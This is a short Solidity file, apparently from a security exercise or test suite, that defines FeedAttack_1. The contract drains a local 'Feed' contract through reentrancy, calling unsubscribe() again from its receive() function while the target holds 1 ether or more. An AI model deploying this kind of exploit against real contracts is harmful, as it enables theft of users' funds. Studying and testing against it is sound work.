// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "../custom/Feed.sol";

contract FeedAttack_1 {
    Feed private _contract;

    constructor() {}

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (address(_contract).balance >= 1 ether) {
            _unsubscribe();
        }
    }

    function attack() external payable {
        _unsubscribe();
    }

    function subscribe() public payable {
        _contract.subscribe{value: msg.value}();
    }

    function _unsubscribe() private {
        _contract.unsubscribe();
    }

    function setContractAddress(address _address) external {
        _contract = Feed(_address);
    }
}
